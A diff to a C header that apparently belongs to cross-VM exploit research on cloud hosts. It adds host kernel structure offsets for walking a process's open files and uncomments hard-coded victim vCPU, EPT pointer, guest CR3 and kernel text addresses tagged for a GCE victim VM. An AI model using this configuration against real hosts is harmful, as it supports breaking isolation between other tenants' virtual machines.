@@ -202,10 +202,24 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define H_TASK_PRIOS		0x64	// int static_prio, normal_prio, rt_priority
 #define H_TASK_TASKS		0x900	// struct list_head tasks
 #define H_TASK_MM		0x950	// struct mm_struct *mm
-#define H_TASK_PID		0x9d0	// pid_t pid, tgid
+#define H_TASK_PID		0xa08	// pid_t pid, tgid
 #define H_TASK_PID_LINKS	0xa78	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
 #define H_TASK_COMM		0xc38	// char comm[TASK_COMM_LEN]
+#define H_TASK_FILES		0xc58   // struct files_struct *files
 // };
+
+// struct files_struct {
+#define H_FILES_FDT		0x20	// struct fdtable *fdt
+// };
+
+// struct fdtable {
+#define H_FDTABLE_FD		0x8	// struct file **fd
+// };
+
+// struct file {
+#define H_FILE_PRIV		0x20	// void *private_data
+// };
+
 
 // struct mm_struct {
 #define H_MM_PGD		0x80	// pgd_t *pgd
@@ -346,10 +360,10 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 // #define OWN_TASK	0xffff936a91dba000
 // #define HCR3		0x111cf6000UL
 // #define OWN_KVM		0xffff9584f2d71000
-// #define VICTIM_VCPU	0xffff934214b80f40
-// #define EPTP		0x12cc82000UL
-// #define GCR3		0x3987106000UL
-// #define GTEXT		0xffffffffb7600000
+#define VICTIM_VCPU	0xffff934214b80f40
+#define EPTP		0x12cc82000UL
+#define GCR3		0x23054e6000UL // 0x3987106000UL
+#define GTEXT		0xffffffffb7600000
 // ---------[ rain-vm-gce-victim ]---------
 // #define BASE		0x257d33218UL
 // #define HOST_DIRECT_MAP	0xffff934040000000
